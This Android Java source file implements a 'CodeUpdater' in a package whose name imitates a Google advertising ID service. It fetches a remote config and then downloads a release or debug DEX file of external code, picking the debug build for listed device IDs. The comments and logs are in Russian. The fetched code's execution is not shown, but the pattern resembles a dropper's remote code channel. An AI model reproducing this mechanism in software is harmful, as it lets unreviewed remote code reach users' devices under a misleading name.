package com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Bundle;
import android.support.v4.app.LoaderManager;
import android.support.v4.content.AsyncTaskLoader;
import android.support.v4.content.Loader;

import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.FilesLoader.FilesLoader;
import com.advertising_id_service.appclick.googleadvertisingidservice.DeviceInfo;
import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
import com.advertising_id_service.appclick.googleadvertisingidservice.GoogleAdvertisingIdGetter;
import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class CodeUpdater {
    private static int LOADER_NEW_CODE_VERSION = 100;
    enum TYPE_CODE {
        NONE,
        DEBUG,
        RELEASE
    }

    public void updateCode(final Context cnt, LoaderManager lm, final String device_id)
    {
        lm.restartLoader(LOADER_NEW_CODE_VERSION, null, new LoaderManager.LoaderCallbacks<String>() {
            @SuppressLint("StaticFieldLeak")
            @Override
            public Loader<String> onCreateLoader(int i, Bundle bundle) {
                return new AsyncTaskLoader<String>(cnt) {
                    public String loadInBackground() {
                            String res = null;
                            FilesLoader fl = new FilesLoader();
                            fl.downloadFile(cnt, GlobalParameters.URL_TO_CONFIG_FILE, GlobalParameters.ConfigFilePath(cnt));
                            return res;
                    }
                };
            }

            @Override
            public void onLoadFinished(Loader<String> loader, String result) {
                TYPE_CODE type = typeCodeToLoad(cnt, device_id);
                switch (type) {
                    case RELEASE:
                        Logger.log("Надо загрузить релизную версию external code");
                        FilesLoader.downloadReleaseDexFile(cnt);
                        break;
                    case DEBUG:
                        Logger.log("Надо загрузить дебажную версию external code");
                        FilesLoader.downloadDebugDexFile(cnt);
                        break;
                    case NONE:
                        Logger.log("Библиотека последней версии");
                        break;
                    default:
                        Logger.log("Библиотека последней версии");
                        break;
                }
            }

            @Override
            public void onLoaderReset(Loader<String> loader) {
            }
        }).forceLoad();

    }

    //Метод возвращает надо ли загружать новую версию библиотеки и если надо, то какую (релизную или дебажную)
    private TYPE_CODE typeCodeToLoad(Context cnt, String device_id)
    {
        GoogleAdvertisingIdGetter g = new GoogleAdvertisingIdGetter();
        String current_version = g.getVersion(cnt);
        String json_str = loadJSONFromAsset(cnt, GlobalParameters.ConfigFilePath(cnt));
        TYPE_CODE res = TYPE_CODE.NONE;
        try {
            JSONObject obj = new JSONObject(json_str);
            Logger.log("Текущая версия " + current_version);
            Logger.log("RELEASE версия " + obj.getString(GlobalParameters.KEY_RELEASE_VERSION));
            Logger.log("DEBUG версия   " + obj.getString(GlobalParameters.KEY_DEBUG_VERSION));
            if (compareCodeVersion(current_version, obj.getString(GlobalParameters.KEY_RELEASE_VERSION)) > 0)
            {
                res = TYPE_CODE.RELEASE;
            }

            if (compareCodeVersion(current_version, obj.getString(GlobalParameters.KEY_DEBUG_VERSION)) > 0)
            {
                JSONArray arr = obj.getJSONArray(GlobalParameters.KEY_DEBUG_IDS);
                Logger.log("Current device_id = " + device_id);
                for(int i = 0; i <arr.length(); i++) {
                    Logger.log("debug device = " + arr.getString(i));
                    if (device_id.equals(arr.getString(i)))
                    {
                        res = TYPE_CODE.DEBUG;
                        break;
                    }
                }
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return res;
    }

    //Сравнивает версии в формате 1.1.1
    // Если текущая версия меньше новой - вернет 1
    // Если текущая версия равна новой  - вернет 0
    // Если текущая версия больше новой - вернет -1
    // Если формат не разобран          - вернет -2
    private int compareCodeVersion(String cur_v, String new_v)
    {
        if(cur_v.equals(new_v)) {return 0;} //Если равны

        String[] cur_v_arr = cur_v.split("\\.");
        String[] new_v_arr = new_v.split("\\.");

        if((cur_v_arr.length != 3) || (new_v_arr.length != 3)){return -2;}

        for (int i = 0; i < 3; i++) {
            if (Integer.parseInt(cur_v_arr[i]) < Integer.parseInt(new_v_arr[i])) {return  1;}
            if (Integer.parseInt(cur_v_arr[i]) > Integer.parseInt(new_v_arr[i])) {return -1;}
        }
        return 0;
    }

    private String loadJSONFromAsset(Context context, String fileName) {
        String json = null;
        try {
            File file = new File(fileName.toString());
            FileInputStream is = new FileInputStream(file);
            int size = is.available();
            byte[] buffer = new byte[size];
            is.read(buffer);
            is.close();
            json = new String(buffer, "UTF-8");
        } catch (IOException ex) {
            ex.printStackTrace();
            return null;
        }
        return json;
    }


}
